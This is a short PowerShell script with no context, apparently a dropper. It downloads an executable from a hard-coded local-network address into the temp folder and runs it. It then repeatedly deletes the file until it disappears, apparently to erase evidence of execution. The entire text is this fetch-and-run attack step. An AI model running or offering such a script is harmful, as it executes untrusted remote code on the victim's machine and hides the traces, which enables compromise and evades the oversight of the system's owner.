Invoke-WebRequest -Uri 'http://192.168.0.10/0.exe' -OutFile $env:temp\0.exe; & "$env:temp\0.exe"

while(Test-Path "$env:temp\0.exe"){
Remove-Item "$env:temp\0.exe"
Start-Sleep 3
}
